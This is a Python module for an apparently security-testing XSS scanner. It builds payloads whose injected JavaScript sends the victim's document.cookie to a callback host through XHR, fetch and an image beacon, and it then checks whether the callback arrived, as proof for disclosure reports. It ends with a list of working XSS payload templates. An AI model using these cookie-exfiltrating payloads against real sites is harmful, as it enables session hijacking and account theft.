"""
XSS Callback Verification Module

This module provides callback-based verification for XSS vulnerabilities to reduce
false positives and provide proof of actual JavaScript execution in the target's
browser context.

Instead of relying solely on DOM sinks or console errors, this system:
1. Generates XSS payloads that make HTTP requests to a callback endpoint
2. Tracks unique payload identifiers
3. Verifies that the callback endpoint was contacted
4. Only marks XSS as SUCCESS when callback is confirmed

This approach provides:
- Proof of actual JavaScript execution
- Evidence for responsible disclosure and bug bounty submissions
- Reduced false positives
- Timestamp and interaction logging

Supported Callback Endpoints:
- Burp Collaborator (https://portswigger.net/burp/documentation/collaborator)
- Interactsh (https://github.com/projectdiscovery/interactsh)
- Custom webhook endpoints
- Internal Megido collaborator server

Usage:
    from scanner.plugins.xss_callback_verifier import XSSCallbackVerifier
    
    verifier = XSSCallbackVerifier(
        callback_endpoint='https://your-callback.com',
        timeout=30
    )
    
    # Generate callback payload
    payload, payload_id = verifier.generate_callback_payload(
        base_payload='<script>PAYLOAD</script>',
        context='html'
    )
    
    # ... inject payload and wait ...
    
    # Verify callback was received
    is_verified, interactions = verifier.verify_callback(payload_id)
    if is_verified:
        print(f"XSS confirmed! Interactions: {len(interactions)}")
"""

import os
import time
import uuid
import hashlib
import logging
import json
import requests
from typing import Dict, List, Any, Optional, Tuple
from datetime import datetime, timedelta
from urllib.parse import urljoin, urlparse

logger = logging.getLogger(__name__)


class XSSCallbackVerifier:
    """
    XSS Callback Verification System
    
    This class handles the generation of callback-based XSS payloads and
    verification of their execution through HTTP callback interactions.
    """
    
    def __init__(self, callback_endpoint: Optional[str] = None, 
                 timeout: int = 30,
                 poll_interval: int = 2,
                 use_internal_collaborator: bool = True):
        """
        Initialize the XSS callback verifier.
        
        Args:
            callback_endpoint: URL of callback endpoint (e.g., Burp Collaborator, Interactsh)
            timeout: Maximum time to wait for callback (seconds)
            poll_interval: Interval between callback checks (seconds)
            use_internal_collaborator: Use internal Megido collaborator if no endpoint provided
        """
        self.callback_endpoint = callback_endpoint
        self.timeout = timeout
        self.poll_interval = poll_interval
        self.use_internal_collaborator = use_internal_collaborator
        self.pending_verifications: Dict[str, Dict] = {}
        
        # If no callback endpoint provided, try to use internal collaborator
        if not self.callback_endpoint and self.use_internal_collaborator:
            self._setup_internal_collaborator()
    
    def _setup_internal_collaborator(self) -> None:
        """Setup internal Megido collaborator server for callbacks."""
        try:
            from django.conf import settings
            from collaborator.models import CollaboratorServer
            
            # Try to find or create a collaborator server
            server = CollaboratorServer.objects.filter(is_active=True).first()
            
            if not server:
                # Create a default collaborator server entry
                logger.info("No active collaborator server found, using localhost fallback")
                # Use localhost with current Django server
                base_url = getattr(settings, 'BASE_URL', 'http://localhost:8000')
                self.callback_endpoint = f"{base_url}/collaborator/callback"
                self.internal_server_id = None
            else:
                # Use the active collaborator server
                self.callback_endpoint = f"http://{server.domain}/callback"
                self.internal_server_id = server.id
                logger.info(f"Using internal collaborator: {self.callback_endpoint}")
        
        except Exception as e:
            logger.warning(f"Could not setup internal collaborator: {e}")
            # Fallback to localhost
            self.callback_endpoint = "http://localhost:8000/collaborator/callback"
            self.internal_server_id = None
    
    def generate_callback_payload(self, 
                                  base_payload: str = '<script>CALLBACK</script>',
                                  context: str = 'html',
                                  include_data: Optional[Dict[str, str]] = None) -> Tuple[str, str]:
        """
        Generate an XSS payload that makes a callback request.
        
        Args:
            base_payload: Base XSS payload template with 'CALLBACK' placeholder
            context: Injection context ('html', 'attribute', 'javascript', 'url')
            include_data: Optional data to include in callback (e.g., cookies, DOM info)
        
        Returns:
            Tuple of (payload_string, payload_id)
        """
        if not self.callback_endpoint:
            raise ValueError("No callback endpoint configured")
        
        # Generate unique payload ID
        payload_id = self._generate_payload_id()
        
        # Build callback URL with payload ID
        callback_url = self._build_callback_url(payload_id)
        
        # Generate JavaScript code for callback
        callback_js = self._generate_callback_javascript(callback_url, include_data)
        
        # Insert callback JavaScript into payload
        payload = base_payload.replace('CALLBACK', callback_js)
        
        # Store pending verification
        self.pending_verifications[payload_id] = {
            'payload': payload,
            'context': context,
            'callback_url': callback_url,
            'created_at': datetime.now().isoformat(),
            'verified': False,
            'interactions': []
        }
        
        logger.info(f"Generated callback payload with ID: {payload_id}")
        return payload, payload_id
    
    def generate_multiple_payloads(self, 
                                   payload_templates: List[str],
                                   context: str = 'html') -> List[Tuple[str, str]]:
        """
        Generate multiple callback payloads from templates.
        
        Args:
            payload_templates: List of payload templates
            context: Injection context
        
        Returns:
            List of (payload, payload_id) tuples
        """
        results = []
        for template in payload_templates:
            try:
                payload, payload_id = self.generate_callback_payload(template, context)
                results.append((payload, payload_id))
            except Exception as e:
                logger.error(f"Error generating payload from template: {e}")
        return results
    
    def _generate_payload_id(self) -> str:
        """Generate a unique payload identifier."""
        # Use UUID4 for uniqueness, then hash for shorter ID
        unique_str = f"{uuid.uuid4()}-{time.time()}"
        payload_id = hashlib.md5(unique_str.encode()).hexdigest()[:16]
        return payload_id
    
    def _build_callback_url(self, payload_id: str) -> str:
        """Build callback URL with payload ID."""
        # Parse endpoint to build proper URL
        parsed = urlparse(self.callback_endpoint)
        
        # Add payload ID as path parameter or query parameter
        if parsed.path and not parsed.path.endswith('/'):
            callback_url = f"{self.callback_endpoint}/{payload_id}"
        else:
            callback_url = f"{self.callback_endpoint}{payload_id}"
        
        return callback_url
    
    def _generate_callback_javascript(self, callback_url: str, 
                                      include_data: Optional[Dict[str, str]] = None) -> str:
        """
        Generate JavaScript code to make callback request.
        
        Args:
            callback_url: URL to call back to
            include_data: Optional data to include in callback
        
        Returns:
            JavaScript code string
        """
        # Build data object if requested
        data_js = ""
        if include_data:
            data_items = [f"'{k}':'{v}'" for k, v in include_data.items()]
            data_js = f",data:{{{','.join(data_items)}}}"
        
        # Generate callback JavaScript
        # Use multiple methods to ensure callback works in different contexts
        js_code = f"""
(function(){{
    try{{
        // Method 1: XMLHttpRequest
        var x=new XMLHttpRequest();
        x.open('GET','{callback_url}?method=xhr&data='+encodeURIComponent(document.cookie){data_js},true);
        x.send();
    }}catch(e){{}}
    try{{
        // Method 2: Fetch API
        fetch('{callback_url}?method=fetch&data='+encodeURIComponent(document.cookie){data_js});
    }}catch(e){{}}
    try{{
        // Method 3: Image tag
        var i=new Image();
        i.src='{callback_url}?method=img&data='+encodeURIComponent(document.cookie);
    }}catch(e){{}}
}})();
""".strip().replace('\n', '')
        
        return js_code
    
    def verify_callback(self, payload_id: str, 
                       wait: bool = True) -> Tuple[bool, List[Dict]]:
        """
        Verify if callback was received for a payload.
        
        Args:
            payload_id: Unique payload identifier
            wait: Whether to wait for callback (up to timeout)
        
        Returns:
            Tuple of (is_verified, interactions_list)
        """
        if payload_id not in self.pending_verifications:
            logger.warning(f"Payload ID {payload_id} not found in pending verifications")
            return False, []
        
        verification = self.pending_verifications[payload_id]
        
        if wait:
            # Poll for callback interactions
            start_time = time.time()
            while (time.time() - start_time) < self.timeout:
                interactions = self._check_for_interactions(payload_id)
                
                if interactions:
                    verification['verified'] = True
                    verification['interactions'] = interactions
                    verification['verified_at'] = datetime.now().isoformat()
                    logger.info(f"Callback verified for payload {payload_id}: {len(interactions)} interaction(s)")
                    return True, interactions
                
                # Wait before next poll
                time.sleep(self.poll_interval)
            
            logger.info(f"Callback timeout for payload {payload_id} (waited {self.timeout}s)")
            return False, []
        else:
            # Check immediately without waiting
            interactions = self._check_for_interactions(payload_id)
            if interactions:
                verification['verified'] = True
                verification['interactions'] = interactions
                verification['verified_at'] = datetime.now().isoformat()
                return True, interactions
            return False, []
    
    def _check_for_interactions(self, payload_id: str) -> List[Dict]:
        """
        Check for callback interactions.
        
        Args:
            payload_id: Payload identifier to check
        
        Returns:
            List of interaction dictionaries
        """
        interactions = []
        
        try:
            # If using internal collaborator, check database
            if self.internal_server_id is not None:
                interactions = self._check_internal_collaborator(payload_id)
            elif self.callback_endpoint:
                # For external endpoints, check via API if available
                interactions = self._check_external_collaborator(payload_id)
        
        except Exception as e:
            logger.error(f"Error checking for interactions: {e}")
        
        return interactions
    
    def _check_internal_collaborator(self, payload_id: str) -> List[Dict]:
        """Check internal Megido collaborator for interactions."""
        try:
            from collaborator.models import Interaction
            
            # Search for interactions containing the payload ID
            # Look in URL path, headers, or body
            interactions = Interaction.objects.filter(
                server_id=self.internal_server_id,
                timestamp__gte=datetime.now() - timedelta(seconds=self.timeout + 60)
            )
            
            matching = []
            for interaction in interactions:
                # Check if payload ID appears in the interaction
                if (payload_id in str(interaction.http_path) or
                    payload_id in str(interaction.http_headers) or
                    payload_id in str(interaction.raw_data)):
                    matching.append({
                        'id': interaction.id,
                        'type': interaction.interaction_type,
                        'source_ip': interaction.source_ip,
                        'timestamp': interaction.timestamp.isoformat(),
                        'http_method': interaction.http_method,
                        'http_path': interaction.http_path,
                        'raw_data': interaction.raw_data[:500]
                    })
            
            return matching
        
        except Exception as e:
            logger.error(f"Error checking internal collaborator: {e}")
            return []
    
    def _check_external_collaborator(self, payload_id: str) -> List[Dict]:
        """
        Check external collaborator endpoint for interactions.
        
        Note: This is a generic implementation. Specific collaborator services
        (Burp Collaborator, Interactsh) may need custom implementations.
        """
        # For now, return empty - would need API integration for specific services
        # Interactsh example: https://github.com/projectdiscovery/interactsh
        # Burp Collaborator: Uses Burp Suite API
        logger.debug("External collaborator check not yet implemented for generic endpoints")
        return []
    
    def get_verification_status(self, payload_id: str) -> Optional[Dict]:
        """
        Get verification status for a payload.
        
        Args:
            payload_id: Payload identifier
        
        Returns:
            Verification status dictionary or None
        """
        return self.pending_verifications.get(payload_id)
    
    def get_all_verifications(self) -> Dict[str, Dict]:
        """Get all pending verifications."""
        return self.pending_verifications.copy()
    
    def clear_verification(self, payload_id: str) -> None:
        """Clear a verification from pending list."""
        if payload_id in self.pending_verifications:
            del self.pending_verifications[payload_id]
    
    def clear_all_verifications(self) -> None:
        """Clear all pending verifications."""
        self.pending_verifications.clear()
    
    def generate_report(self, payload_id: str) -> str:
        """
        Generate a detailed report for a verified payload.
        
        Args:
            payload_id: Payload identifier
        
        Returns:
            Formatted report string
        """
        verification = self.pending_verifications.get(payload_id)
        if not verification:
            return "No verification found for payload ID"
        
        report = f"""
╔═══════════════════════════════════════════════════════════════╗
║        XSS CALLBACK VERIFICATION REPORT                       ║
╚═══════════════════════════════════════════════════════════════╝

Payload ID: {payload_id}
Status: {'✓ VERIFIED' if verification['verified'] else '✗ NOT VERIFIED'}
Context: {verification['context']}
Created: {verification['created_at']}
{'Verified: ' + verification.get('verified_at', 'N/A') if verification['verified'] else ''}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

PAYLOAD:
{verification['payload']}

CALLBACK URL:
{verification['callback_url']}

"""
        
        if verification['verified'] and verification['interactions']:
            report += f"""━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

INTERACTIONS ({len(verification['interactions'])}):

"""
            for i, interaction in enumerate(verification['interactions'], 1):
                report += f"""Interaction #{i}:
  Type: {interaction.get('type', 'N/A')}
  Source IP: {interaction.get('source_ip', 'N/A')}
  Timestamp: {interaction.get('timestamp', 'N/A')}
  HTTP Method: {interaction.get('http_method', 'N/A')}
  HTTP Path: {interaction.get('http_path', 'N/A')}

"""
        
        report += """━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

This report confirms that JavaScript was successfully executed in the
target's browser context and made a callback to the verification endpoint.

This is proof of actual XSS exploitability, suitable for responsible
disclosure and bug bounty submissions.

"""
        
        return report


def get_default_callback_payloads() -> List[str]:
    """
    Get default XSS payload templates with callback placeholder.
    
    Returns:
        List of payload templates with 'CALLBACK' placeholder
    """
    return [
        # Basic script injections
        '<script>CALLBACK</script>',
        '<script src="data:text/javascript,CALLBACK"></script>',
        
        # Event handlers
        '<img src=x onerror="CALLBACK">',
        '<svg/onload="CALLBACK">',
        '<body onload="CALLBACK">',
        '<iframe onload="CALLBACK">',
        
        # DOM-based
        '<input onfocus="CALLBACK" autofocus>',
        '<select onfocus="CALLBACK" autofocus>',
        '<textarea onfocus="CALLBACK" autofocus>',
        
        # Advanced
        '<details open ontoggle="CALLBACK">',
        '<marquee onstart="CALLBACK">',
        '<video><source onerror="CALLBACK">',
        '<audio src=x onerror="CALLBACK">',
        
        # HTML5
        '<input type="image" src=x onerror="CALLBACK">',
        '<form><button formaction="javascript:CALLBACK">',
    ]
